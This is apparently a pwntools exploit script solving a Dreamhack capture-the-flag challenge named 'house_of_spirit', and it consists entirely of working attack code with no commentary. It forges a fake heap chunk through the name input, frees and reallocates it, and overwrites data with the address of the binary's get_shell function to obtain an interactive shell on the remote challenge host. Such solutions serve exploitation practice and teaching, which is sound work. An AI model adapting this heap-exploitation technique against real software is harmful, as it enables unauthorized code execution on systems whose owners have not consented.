from pwn import *

r = remote("host3.dreamhack.games", 21194)
e = ELF("./house_of_spirit")

def create(size, data):
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Size: ", str(size).encode())
    r.sendafter(b"Data: ", data)

def delete(addr):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Addr: ", str(addr).encode())

def getshell():
    r.sendlineafter(b"> ", b"3")
    r.interactive()

r.sendafter(b"name: ", p64(0)+p64(0x90))
name = int(r.recvuntil(b":")[:-1],16)

delete(name+0x10)
create(0x80, b"A"*0x20+b"B"*0x8+p64(e.symbols["get_shell"]))
getshell()